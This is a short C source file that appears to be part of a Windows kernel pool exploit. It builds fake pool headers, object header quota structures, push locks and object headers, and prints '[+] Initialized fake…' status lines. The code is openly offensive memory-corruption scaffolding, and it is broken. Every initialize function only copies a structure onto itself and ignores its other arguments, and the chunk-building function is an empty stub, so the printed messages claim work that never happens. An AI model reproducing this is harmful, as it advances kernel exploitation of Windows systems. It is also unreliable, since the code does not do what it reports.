#include "exploit.h"

void initialize_pool_header(PPOOL_HEADER input_pool_header)
{
	POOL_HEADER pool_header = *input_pool_header;	// dt nt!_POOL_HEADER b8c3fdc0

	*input_pool_header = pool_header;
}

void initialize_object_header_quota(POBJECT_HEADER_QUOTA_INFO input_object_header_quota)
{
	OBJECT_HEADER_QUOTA_INFO object_header_quota = *input_object_header_quota;

	*input_object_header_quota = object_header_quota;
}

void initialize_ex_push_lock(PEX_PUSH_LOCK input_ex_push_lock)
{
	EX_PUSH_LOCK ex_push_lock = *input_ex_push_lock;

	*input_ex_push_lock = ex_push_lock;
}

void initialize_quad(PQUAD input_quad)
{
	QUAD quad = *input_quad;

	*input_quad = quad;
}

void initialize_object_header(POBJECT_HEADER input_object_header, PEX_PUSH_LOCK input_ex_push_lock, PVOID input_heap_allocation_address, PQUAD input_quad)
{
	OBJECT_HEADER object_header = *input_object_header;

	*input_object_header = object_header;
}

void initialize_main_pool_structs(char* address, PPOOL_HEADER input_pool_header, POBJECT_HEADER_QUOTA_INFO input_object_header_quota, PEX_PUSH_LOCK input_push_lock, PQUAD input_quad, POBJECT_HEADER input_object_header)
{
	initialize_pool_header(input_pool_header);
	printf("\n[+] Initialized fake pool header.");

	initialize_object_header_quota(input_object_header_quota);
	printf("\n[+] Initialized fake object header quota.");

	initialize_ex_push_lock(input_push_lock);
	printf("\n[+] Initialized fake push lock.");

	initialize_quad(input_quad);
	printf("\n[+] Initialized fake quad.");

	initialize_object_header(input_object_header, input_push_lock, address, input_quad);
	printf("\n[+] Initialized fake object header.");
}

void build_pool_chunk(char* fake_pool_memory_page, POOL_HEADER pool_header, OBJECT_HEADER_QUOTA_INFO object_header_quota, OBJECT_HEADER object_header)
{
	// ...
}